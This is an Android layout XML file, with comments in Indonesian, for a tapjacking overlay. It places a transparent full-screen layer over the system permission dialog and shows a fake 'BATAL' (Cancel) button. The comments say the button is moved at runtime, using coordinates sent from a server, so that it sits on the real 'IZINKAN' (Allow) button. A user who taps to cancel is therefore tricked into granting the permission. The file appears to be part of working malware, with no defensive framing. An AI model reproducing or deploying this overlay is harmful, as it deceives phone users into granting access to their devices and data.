<?xml version="1.0" encoding="utf-8"?>
<!--
    overlay_trick.xml
    Layout transparan penuh layar yang menimpa dialog izin sistem.
    Diinflate oleh OverlayTrickManager saat auto-trigger aktif.

    Posisi tombol "BATAL" (palsu) dikontrol lewat LayoutParams di runtime
    agar bisa disesuaikan ke koordinat tombol "IZINKAN" milik ROM spesifik.
-->
<FrameLayout
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/overlayTrickRoot"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="@android:color/transparent"
    android:clickable="true"
    android:focusable="false">

    <!--
        Tombol palsu — terlihat user sebagai "BATAL".
        Posisi (gravity + margin) di-override oleh OverlayTrickManager
        berdasarkan config JSON targetX/targetY dari server.
        Default: Gravity.BOTTOM | CENTER_HORIZONTAL, bottomMargin 180dp
        (sejajar tombol "IZINKAN" AOSP default).
    -->
    <TextView
        android:id="@+id/fakeCancelBtn"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_gravity="bottom|center_horizontal"
        android:layout_marginBottom="180dp"
        android:text="BATAL"
        android:textColor="#FFFFFF"
        android:textSize="15sp"
        android:textStyle="bold"
        android:paddingStart="40dp"
        android:paddingEnd="40dp"
        android:paddingTop="14dp"
        android:paddingBottom="14dp"
        android:background="@drawable/fake_btn_bg"
        android:elevation="12dp" />

</FrameLayout>
